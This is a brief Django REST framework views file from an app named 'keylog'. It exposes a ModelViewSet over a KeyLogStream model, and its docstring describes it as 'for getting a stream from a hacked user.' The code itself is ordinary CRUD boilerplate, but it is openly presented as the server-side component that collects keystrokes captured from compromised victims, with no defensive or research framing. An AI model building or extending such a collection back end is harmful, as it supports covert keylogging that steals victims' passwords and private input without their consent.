from django.shortcuts import render
from rest_framework import viewsets
from keylog import serializers
from keylog.models import KeyLogStream
# Create your views here.

class streamViewSet(viewsets.ModelViewSet):
    """for getting a stream from a hacked user"""
    serializer_class = serializers.streamSerializer
    queryset = KeyLogStream.objects.all()
